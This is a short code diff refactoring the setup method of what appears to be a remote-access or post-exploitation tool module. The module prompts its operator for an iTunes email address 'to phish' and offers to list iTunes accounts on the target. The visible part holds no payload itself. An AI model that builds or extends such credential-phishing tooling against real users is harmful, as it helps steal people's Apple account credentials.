@@ -14,8 +14,8 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def setup(self, view) -> Tuple[bool, Optional[dict]]:
-        should_list = view.prompt("Would you like to list available iTunes accounts (recommended)? [Y/n]", [
+    def setup(self) -> Tuple[bool, Optional[dict]]:
+        should_list = self._view.prompt("Would you like to list available iTunes accounts (recommended)? [Y/n]", [
             ("The next prompt will ask you for an iTunes account (email).", "attention")
         ]).lower()
 
@@ -24,10 +24,10 @@ class Module(ModuleABC):
                 "list_accounts": True
             }
         else:
-            email = view.prompt("iTunes email address to phish: ")
+            email = self._view.prompt("iTunes email address to phish: ")
 
             if not email or "@" not in email:
-                view.output("Invalid iTunes email address, cancelled.", "attention")
+                self._view.output("Invalid iTunes email address, cancelled.", "attention")
                 return False, None
             else:
                 return True, {
